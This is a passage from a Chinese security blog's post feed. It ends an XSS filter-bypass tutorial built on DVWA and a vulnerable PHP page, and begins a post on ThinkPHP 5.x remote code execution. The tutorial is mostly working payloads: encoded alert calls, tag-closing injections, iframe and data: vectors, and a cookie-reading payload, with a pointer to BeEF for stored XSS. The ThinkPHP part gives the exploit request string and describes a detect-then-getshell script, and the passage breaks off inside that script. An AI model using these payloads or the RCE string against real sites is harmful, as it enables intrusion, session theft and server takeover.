class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p>当输入alert的时候就会被替换成空，当然我们可以使用其他的什么标签来代替script，但是如果只用script如何绕过呢？使用js转义。将alert转义</p><blockquote><p>当js解释器在标识符名称(例如函数名，属性名等等)中遇到unicode编码会进行解码，并使其标志符照常生效。而在字符串中遇到unicode编码时会进行解码只会被当作字符串。</p></blockquote><p>也就是说unicode编码只能编码属性名</p><p>原</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>js转义后</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;\u0061\u006c\u0065\u0072\u0074(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/01/12/FjEh24.png" alt="FjEh24.png"></p><p>注意：使用unicode编码之前要确定对方有没有过滤\</p><p>html转义：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">当浏览器接受到一份HTML代码后，会对标签之间（&lt;p&gt;xxx&lt;/p&gt;等，&lt;script&gt;除外)、标签的属性中</span><br><span class="line">（&lt;a href=&apos;xxxx&apos;&gt;）进行实体字符解码变为相应的字符，而不会发挥出其本来该有的功能，</span><br><span class="line">如：&amp;#60;被解码为&lt;后仅被当作字符，而不会被当成标签名的起始。既然是字符串，</span><br><span class="line">那在href=&apos;xx&apos;这些属性值本来就是字符串的地方可以作为一种可能的绕过的手段，JS字符串中，字符还可以表示为unicode的形式</span><br></pre></td></tr></table></figure><p>源：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;javascript:alert(1)&quot;&gt;s&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>转义后</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;javascript:&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;1&amp;#41;&quot;&gt;s&lt;/a&gt;</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/01/12/FjVKZq.md.png" alt="FjVKZq.md.png"></p><p><img src="https://s2.ax1x.com/2019/01/12/FjVmss.png" alt="FjVmss.png"></p><p><b>输出在&lt;script&gt;&lt;/script&gt;之间的情况</b><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$name=$_POST[&apos;name&apos;];</span><br><span class="line">$guanjianzi=&quot;alert&quot;;</span><br><span class="line">$q=str_replace(&quot;alert&quot;,&quot; &quot;,$name);</span><br><span class="line">$c=&quot;&lt;script&gt;var w=[$q]$q;&lt;/script&gt;&quot;;</span><br><span class="line">echo $c;</span><br><span class="line">#echo &quot; &lt;script&gt;var a=[ ];&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;script&gt;b=[ ]&lt;/script&gt;&quot;;</span><br><span class="line">/*</span><br><span class="line"> &lt;script&gt;var a=[ ];&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;script&gt;b=[ ]&lt;/script&gt;</span><br><span class="line"> *</span><br><span class="line"> */</span><br><span class="line">#echo &quot;&lt;script&gt; var a=[]&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;script&gt;var a=[];document.write(a);&lt;/script&gt;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>绕过：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">]&lt;/script&gt;&lt;script&gt;\u0061\u006c\u0065\u0072\u0074(1)&lt;/script&gt;&lt;script&gt; //闭合对应前后script标签</span><br></pre></td></tr></table></figure></p><p><img src="https://s2.ax1x.com/2019/01/12/FjdSVx.png" alt="FjdSVx.png"></p><p><b>输出在html属性里面</b><br>假设输出在input标签里面</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$name=$_POST[&apos;name&apos;];</span><br><span class="line">$guanjianzi=&quot;alert&quot;;</span><br><span class="line">$q=str_replace(&quot;alert&quot;,&quot; &quot;,$name);</span><br><span class="line">$c=&quot;&lt;input value=&apos;$q&apos;&gt;&quot;;</span><br><span class="line">echo $c;</span><br><span class="line">#echo &quot; &lt;script&gt;var a=[ ];&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;script&gt;b=[ ]&lt;/script&gt;&quot;;</span><br><span class="line">/*</span><br><span class="line"> &lt;script&gt;var a=[ ];&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;script&gt;b=[ ]&lt;/script&gt;</span><br><span class="line"> *</span><br><span class="line"> */</span><br><span class="line">#echo &quot;&lt;script&gt; var a=[]&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;script&gt;var a=[];document.write(a);&lt;/script&gt;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>绕过：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; onclick=&apos;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;</span><br></pre></td></tr></table></figure></p><p><img src="https://s2.ax1x.com/2019/01/12/FjBGsH.png" alt="FjBGsH.png"></p><p><b>假设输出在img标签里</b></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$name=$_POST[&apos;name&apos;];</span><br><span class="line">$guanjianzi=&quot;alert&quot;;</span><br><span class="line">$q=str_replace(&quot;alert&quot;,&quot; &quot;,$name);</span><br><span class="line">$c=&quot;&lt;img src=&apos;$q&apos;&gt;&quot;;</span><br><span class="line">echo $c;</span><br><span class="line">#echo &quot;&lt;img src=&apos;&apos; onerror=&apos;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&apos;&gt;&quot;;</span><br><span class="line">#echo &quot; &lt;script&gt;var a=[ ];&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;script&gt;b=[ ]&lt;/script&gt;&quot;;</span><br><span class="line">/*</span><br><span class="line"> &lt;script&gt;var a=[ ];&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;script&gt;b=[ ]&lt;/script&gt;</span><br><span class="line"> *</span><br><span class="line"> */</span><br><span class="line">#echo &quot;&lt;script&gt; var a=[]&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;script&gt;var a=[];document.write(a);&lt;/script&gt;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>绕过：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;1/**/onerror=&apos;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/01/12/FjBdFP.md.png" alt="FjBdFP.md.png"></p><p>输出在标签里的绕过总结：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.先想办法闭合周围的什么双引号之类的东西</span><br><span class="line">2.判断有什么过滤掉的，如果没有过滤自然最好</span><br><span class="line">3.查询标签对应可以执行js的属性，然后插入代码即可</span><br></pre></td></tr></table></figure></p><p><b>DOM型的xss</b><br>这里非常蛋疼，chrome拦截了DVWA那边的xss，还要我开虚拟机。。。<br>DOM型xss分为两种：<br>1.可见型DOM xss<br>2.不可见型DOM xss</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">何为DOM？,你插入的代码会暂存在某些标签之中，并且影响输出</span><br></pre></td></tr></table></figure><p>DVWA的DOM xss就是不可见类型<br><img src="https://s2.ax1x.com/2019/01/13/FvJ9te.png" alt="FvJ9te.png"></p><p>源代码不可见<br><img src="https://s2.ax1x.com/2019/01/13/FvJipd.md.png" alt="FvJipd.md.png"></p><p>F12可见<br><img src="https://s2.ax1x.com/2019/01/13/FvJF1A.md.png" alt="FvJF1A.md.png"></p><p>low级无任何防御直接插入payload<br><img src="https://s2.ax1x.com/2019/01/13/FvJVnP.md.png" alt="FvJVnP.md.png"></p><p>medimu级过滤了script</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">// Is there any input? </span><br><span class="line">if ( array_key_exists( &quot;default&quot;, $_GET ) &amp;&amp; !is_null ($_GET[ &apos;default&apos; ]) ) &#123;</span><br><span class="line">    $default = $_GET[&apos;default&apos;]; </span><br><span class="line">     </span><br><span class="line">    # Do not allow script tags </span><br><span class="line">    if (stripos ($default, &quot;&lt;script&quot;) !== false) &#123;  /*判断script是否出现在了参数里面*/</span><br><span class="line">        header (&quot;location: ?default=English&quot;); </span><br><span class="line">        exit; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">使用：&lt;/select&gt;&lt;img src=1 onerror=alert(1)&gt; //要闭合select标签，因为img在select标签里面是不可见的</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/01/13/FvJZ0f.md.png" alt="FvJZ0f.md.png"></p><p>high级对default进行了判断</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">// Is there any input? </span><br><span class="line">if ( array_key_exists( &quot;default&quot;, $_GET ) &amp;&amp; !is_null ($_GET[ &apos;default&apos; ]) ) &#123;  /*判断是否有default这个键名和传的GETdefault参数不为null*/</span><br><span class="line"></span><br><span class="line">    # White list the allowable languages </span><br><span class="line">    switch ($_GET[&apos;default&apos;]) &#123;  /*判断default是否为三个的其中一个，如果不是则重新设置header头，302跳转*/</span><br><span class="line">        case &quot;French&quot;: </span><br><span class="line">        case &quot;English&quot;: </span><br><span class="line">        case &quot;German&quot;: </span><br><span class="line">        case &quot;Spanish&quot;: </span><br><span class="line">            # ok </span><br><span class="line">            break; </span><br><span class="line">        default: </span><br><span class="line">            header (&quot;location: ?default=English&quot;); </span><br><span class="line">            exit; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>使用#杀掉判断</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/01/13/FvJyB6.md.png" alt="FvJyB6.md.png"></p><p><b>存储型xss</b><br>当我们插入的恶意代码都会保留在数据库，下次在访问的时候就会自动执行js。</p><p>每次进入到页面都会执行js</p><p><img src="https://s2.ax1x.com/2019/01/13/FvJj3j.md.png" alt="FvJj3j.md.png"></p><p>这里就不重复了，告辞（滑稽）<br>用beef来配置存储型xss是个不错的选择</p><p>总结：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line">xss漏洞起因</span><br><span class="line">    没有做好对应的过滤标签措施，导致攻击者可以注入恶意代码</span><br><span class="line"></span><br><span class="line">对付那种无任何过滤的</span><br><span class="line">    &lt;img src=1 onerror=alert(document.cookie)&gt;</span><br><span class="line">    &lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</span><br><span class="line">    &lt;script&gt;eval(alert(&apos;xss&apos;))&lt;/script&gt;</span><br><span class="line">    &lt;a href=&quot;javascript:localhoin=alert(1)&quot;&gt;GO&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">输出在&amp;lt;script&amp;gt;&amp;lt;/script&amp;gt;之间的情况(意思就是你在script里面，得把前面的闭合了在注入语句，然后因为你在script里面直接输入语句即可)</span><br><span class="line">    先闭合上一个script然后在注入恶意代码:&lt;/script&gt;&lt;script&gt;alert(&quot;xss&quot;)</span><br><span class="line">    如果&lt;,&gt;,/等符号被过滤了可以用：eval(alert(1)) #eval()函数用于直接执行代码 参考：http://www.runoob.com/jsref/jsref-eval.html</span><br><span class="line">    </span><br><span class="line">输出在其他标签里面</span><br><span class="line">    注意：html转义后在标签的属性中会其到一定的绕过作用 参考文章：https://www.cnblogs.com/iceli/p/8598709.html</span><br><span class="line">    　当浏览器接受到一份HTML代码后，会对标签之间（&lt;p&gt;xxx&lt;/p&gt;等，&lt;script&gt;除外)、标签的属性中（&lt;a href=&apos;xxxx&apos;&gt;）进行实体字符解码变为相应的字符，而不会发挥出其本来该有的功能，如：&amp;#60;被解码为&lt;后仅被当作字符，而不会被当成标签名的起始。既然是字符串，那在href=&apos;xx&apos;这些属性值本来就是字符串的地方可以作为一种可能的绕过的手段。如：</span><br><span class="line">        &lt;a href=&quot;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&quot;&gt;&lt;/a&gt;</span><br><span class="line">    如在&lt;input&gt;里，解决办法：&lt;input type=&quot;text&quot; value=&quot;&quot; onclick=&quot;alert(1)&quot;&gt;</span><br><span class="line">    出现在a标签的href里面，类似于：&lt;a href=&quot;javascript:wds=&apos;&apos;http://www.dddd.com&quot;.getElementById(&apos;ddd&apos;).value+&apos;&amp;g=&lt;你输入的值&gt;&apos;&gt;</span><br><span class="line">    由于在href里面，可以使用javascript。就构造&lt;a href=&quot;javascript:wds=&apos;&apos;http://www.dddd.com&quot;.getElementById(&apos;ddd&apos;).value+&apos;&amp;g=alert(1)&apos;&gt;</span><br><span class="line">    如果单引号等字符被过滤的话，使用：&lt;a href=&quot;javascript:wds=&apos;&apos;http://www.dddd.com&quot;.getElementById(&apos;ddd&apos;).value+&apos;&amp;g=alert&amp;#x28;1&amp;#x29&apos;&gt; //实体化被过滤的符号</span><br><span class="line">    </span><br><span class="line"> 宽字节xss：</span><br><span class="line">    如果页面用了gbk编码的话，可以用对应的编码进行编码被过滤的符号导致可以绕过过滤</span><br><span class="line">    </span><br><span class="line"> 空格被实体化过滤</span><br><span class="line">    注解：javascript的注释符为/**/ , //</span><br><span class="line">    当空格被过滤后，使用注释符来绕过。例子：</span><br><span class="line">    location.href=&quot;.........&quot;+&quot;&amp;ss=aaaa\&quot;+&quot;&amp;from==1;function/**/from()&#123;&#125;//&quot;+&quot;&amp;param=&quot;;</span><br><span class="line">    location.href=&quot;.........&quot;+&quot;&amp;ss=aaaa\&quot;+&quot;&amp;from==1;alert(1);function/**/from()&#123;&#125;//&quot;+&quot;&amp;param=&quot;;</span><br><span class="line">    </span><br><span class="line">    学到的js的一个特性：javascript会先解析函数在解析其他</span><br><span class="line">    例子：</span><br><span class="line">    a();</span><br><span class="line">    function as() &#123;&#125; </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    而js执行顺序是：</span><br><span class="line">    function as() &#123;&#125;</span><br><span class="line">    a();</span><br><span class="line">    </span><br><span class="line">当输入的语句出现在注释里 (有机可乘的xss)</span><br><span class="line">    当输入的语句出现在js注释的源码的时候，加一个换行符就能引发xss</span><br><span class="line">    例如：http://xxx.com/jj.php?xxx=aaaaa</span><br><span class="line">    </span><br><span class="line">    &lt;script&gt;</span><br><span class="line">    //function  A() &#123;</span><br><span class="line">    //    var g=getElementById(demo).value;</span><br><span class="line">    //    document.write(g);</span><br><span class="line">    //&#125;</span><br><span class="line">    //document.write(你输入的)</span><br><span class="line">    document.write(&quot;wwww&quot;)</span><br><span class="line">;    &lt;/script&gt;</span><br><span class="line"></span><br><span class="line">    构造的xss语句：http://xxx.com/jj.php?xxx=%0aalert(1) //) #通过%0a换行符，换到了没有注释的下一行然后闭合掉后面的括号</span><br><span class="line"></span><br><span class="line">使用反斜杆构造xss</span><br><span class="line">    当输入的语句处于多行js代码之中，使用\分开，例子：</span><br><span class="line">    &lt;script&gt;getTop().location.href=&quot;/cgi-bin/loginpage?autologin=n&amp;errtype=1&amp;verify=&amp;clientuin=&quot;+&quot;&amp;t=&quot;+&quot;&amp;alias=&quot;+&quot;&amp;regalias=&quot;+&quot;&amp;delegate_url=%2Fcgi-bin%2Fframe_html%3Furl%3D%252Fcgi-bin%252Fsetting10%253Faction%253Dlist%2526t%253Dsetting10%2526ss%253Dindex%2526Mtype%253D1%2526clickpos%253D20%2526loc%253Ddelegate%252Cwebmap%252C%252C1&quot;+&quot;&amp;title=&quot;+&quot;&amp;url=%2Fcgi-bin%2Flogin%3Fvt%3Dpassport%26ss%3Daaa%2522%26from%3Dbbb\%26delegate_url%3D%252Fcgi-bin%252Fframe_html%253Furl%253D%2525252Fcgi-bin%2525252Fsetting10%2525253Faction%2525253Dlist%25252526t%2525253Dsetting10%25252526ss%2525253Dindex%25252526Mtype%2525253D1%25252526clickpos%2525253D20%25252526loc%2525253Ddelegate%2525252Cwebmap%2525252C%2525252C1&quot;+&quot;&amp;org_fun=&quot;+&quot;&amp;aliastype=&quot;+&quot;&amp;ss=aaa&quot;+&quot;&amp;from=bbb&quot;+&quot;&amp;param=&quot;+&quot;&amp;sp=6fa57ce5b3047ebMTM1NTQwOTA2Mg&quot;+&quot;&amp;r=3ec785174fff5206ed6f0cf4a8c5e3c5&quot;+&quot;&amp;ppp=&quot;+&quot;&amp;secpp=&quot;&lt;/script&gt;</span><br><span class="line">    使用\分割语句然后想办法闭合</span><br><span class="line">    </span><br><span class="line"> ：反弹xss一般出现在url拦</span><br><span class="line"></span><br><span class="line">DOM型xss</span><br><span class="line">DOM型的xss就是通过输入，改变了js代码的一部分。dom型xss又分两种：</span><br><span class="line">1.可见型DOM xss，输入的东西改变了页面的源码。但是F12查看源码可见</span><br><span class="line">类似于：</span><br><span class="line">&lt;strong id=&quot;titleshow&quot;&gt;按职业1检索：aaaaaaa &lt;/strong&gt;&lt;/div&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">if(&quot;aaaaaaa&quot;==&quot;&quot;)</span><br><span class="line">document.getElementById(&quot;titleshow&quot;).innerHTML=&quot;按地区检索：全部明星&quot;;</span><br><span class="line">if(&quot;职业1&quot;==&quot;职业1&quot;)</span><br><span class="line">document.getElementById(&quot;titleshow&quot;).innerHTML=&quot;按职业检索：aaaaaaa&quot;;</span><br><span class="line">if(&quot;职业1&quot;==&quot;职业2&quot;)</span><br><span class="line">document.getElementById(&quot;titleshow&quot;).innerHTML=&quot;按职业检索：aaaaaaa&quot;;</span><br><span class="line">if(&quot;职业1&quot;==&quot;职业3&quot;)</span><br><span class="line">document.getElementById(&quot;titleshow&quot;).innerHTML=&quot;按职业检索：aaaaaaa&quot;;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">aaaaa为我们输入的，假设现在&lt;,&gt;被过滤了。但是\没被过滤，该如何构造xss呢</span><br><span class="line">由于\没有被过滤，使用unicode编码&lt;和&gt;，变为</span><br><span class="line">被url解释器解释完后为&lt;a href=&quot;javascript:alert(1)&quot;&gt;&lt;/a&gt;，url中出现了javascript:，指明了后面的语句要当作js执行，所以再次把解释后的字符交给js解释器解释，可以弹窗。</span><br><span class="line"></span><br><span class="line">当js解释器在标识符名称(例如函数名，属性名等等)中遇到unicode编码会进行解码，并使其标志符照常生效。而在字符串中遇到unicode编码时会进行解码只会被当作字符串。如：</span><br><span class="line"></span><br><span class="line"> &lt;script&gt;\u0061\u006c\u0065\u0072\u0074(1)&lt;/script&gt;</span><br><span class="line"> unicode编码在标签的属性之中可用，如果在输出使用不会影响上下文</span><br><span class="line"> </span><br><span class="line"> 参考文章：https://www.cnblogs.com/iceli/p/8598709.html</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">2.不可见型DOM xss</span><br><span class="line">    类似于DVWA里的DOM型xss，只能用调试工具定位。审核源代码是看不见的</span><br><span class="line">    记录一些DOM型xss常用的语句：</span><br><span class="line">    在iframe中执行js:&lt;iframe onload=&quot;alert(1)&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">                               &lt;iframe src=&quot;javascript:alert(1)&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">                               &lt;iframe src=&quot;vbscript:msbox(1)&quot;&gt;&lt;/iframe&gt; IE执行VBScript代码</span><br><span class="line">                               &lt;iframe src=&quot;data:text/html&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt; chrome执行data协议代码</span><br><span class="line">                               &lt;iframe src=&quot;data:text/html,&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&quot;&gt;&lt;/iframe&gt; 上面的变体</span><br><span class="line">                               &lt;iframe srcdoc=&quot;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&quot;&gt;&lt;/iframe&gt; chrome下的srcdoc属性</span><br><span class="line"> 总结：在探测一个地方是否有xss的时候，插入好搜索的语句例如：aaaaaa。然后f12源码搜索，分析出现的地方，看看哪里能实现xss。如果有被过滤</span><br><span class="line"> 了，先试试html转义，注意闭合。当\符号没被过滤的时候可以使用unicode编码来进行代替被过滤的函数或符号 （前提是在script标签里）</span><br><span class="line"> </span><br><span class="line">  存储型xss：</span><br><span class="line">        一定要记住本节最开头的话，存储型XSS，输出的位置不一定出现在输入的位置。</span><br><span class="line">        7. 因而我们有时候需要逆向的思维，来寻找存储型XSS。 大概思路如下：</span><br><span class="line">        7.1 先找到输出点，然后猜测此处输出是否会被过滤。</span><br><span class="line">        7.2 如果觉得可能没过滤，我们再找到这个输出是在哪里输入的。</span><br><span class="line">        7.3 接着开始测试输入，看输出的效果。</span><br><span class="line">        7.4 如果没过滤，那么你就成功了，否则你可以放弃掉它。</span><br><span class="line"></span><br><span class="line">xss 存储型payload：http://html5sec.org/</span><br></pre></td></tr></table></figure></p><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>thinkphp_5.*_Remote Code Execution</title>
      <link href="/posts/2f842885.html"/>
      <url>/posts/2f842885.html</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>今天考完期末考，回到家听到我大即刻群的皇上说有thinkphp5.*远程代码执行漏洞。然后接下来有一位大佬发了详细的word文档，顿时把R键扣烂，蛮王附体 (皮那么一下)<br><img src="http://p3.pstatp.com/large/pgc-image/152542207823371a7c69515" alt="152542207823371a7c69515"></p><p>提醒：倘若你因为使用此洞造成当事人蹲监，不关本人事</p><h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>详细的漏洞说明与复现：<a href="https://github.com/422926799/python/blob/master/ThinkPHP%205.0%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.docx" target="_blank" rel="noopener">python/ThinkPHP 5.0 远程代码执行漏洞分析.docx at master · 422926799/python · GitHub</a><br>靶机提供：<a href="https://github.com/vulhub/vulhub/tree/master/thinkphp/5.0.23-rce" target="_blank" rel="noopener">vulhub/thinkphp/5.0.23-rce at master · vulhub/vulhub · GitHub</a></p><p>脚本地址：<a href="https://github.com/422926799/python/tree/master/thinkphp_%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C" target="_blank" rel="noopener">python/thinkphp_远程代码执行 at master · 422926799/python · GitHub</a></p><p>漏洞讲解：<br>看文档</p><p>脚本思路：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">文档给出的payload是：_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=whoami</span><br><span class="line">修改为：_method=__construct&amp;filter[]=phpinfo&amp;method=get&amp;server[REQUEST_METHOD]=1</span><br><span class="line">首先访问修改后的payload，判断是否有PHP Version这个关键字，如果有就存在漏洞</span><br><span class="line">然后在进行getshell操作</span><br></pre></td></tr></table></figure><p>详细代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span 